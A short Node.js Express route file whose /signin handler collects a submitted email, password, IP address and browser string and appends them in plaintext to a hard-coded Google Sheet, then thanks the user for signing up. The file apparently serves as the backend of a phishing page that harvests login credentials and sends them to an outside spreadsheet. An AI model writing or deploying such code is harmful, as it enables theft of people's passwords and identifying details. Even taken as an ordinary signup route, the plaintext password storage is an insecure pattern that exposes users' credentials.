const express = require("express");
const { google } = require("googleapis");
let router = express.Router();
require("dotenv").config();

router.post("/signin", async (req, res) => {
  try {
    const { email, password, ip, browser } = req.body;

    const auth = new google.auth.GoogleAuth({
      keyFile: "credentials.json",
      scopes: "https://www.googleapis.com/auth/spreadsheets",
    });

    const client = await auth.getClient();
    const spreadsheetId = "1SWOn5RJ-tEvVwhXQIiZ2U2mcHxYj3La502bt4xQ6oz0";
    const googleSheets = google.sheets({
      version: "v4",
      auth: client,
    });

    await googleSheets.spreadsheets.values.append({
      auth,
      spreadsheetId,
      range: "Sheet1!A:B",
      valueInputOption: "USER_ENTERED",
      resource: {
        values: [[email, password, ip, browser]],
      },
    });

    return res.status(200).json({
      successMessage: "Thanks for signing up.",
    });

  } catch (error) {
    console.log(error, 'error here');
    return res.json({
      errorMessage: "Something went wrong.",
    });
  }
});

module.exports = router;
